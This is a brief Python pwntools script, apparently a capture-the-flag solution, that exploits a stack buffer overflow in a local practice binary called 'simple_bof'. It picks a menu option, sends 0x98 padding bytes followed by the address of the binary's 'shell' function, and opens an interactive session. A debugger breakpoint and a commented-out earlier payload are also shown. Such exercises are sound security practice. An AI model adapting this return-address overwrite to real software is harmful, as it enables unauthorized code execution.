from pwn import *

context.log_level = "DEBUG"
context.arch = "amd64"

e = ELF("./simple_bof")
p = process("./simple_bof")

attach(p, "b *0x0000000000400982\nc")
raw_input()

p.sendlineafter(">", "004")
# p.sendlineafter("\n", flat("A"*0x90, 0x7fff909b65a8, e.symbols["shell"]))
p.sendlineafter("\n", flat("A"*0x98, e.symbols["shell"]))

p.interactive()
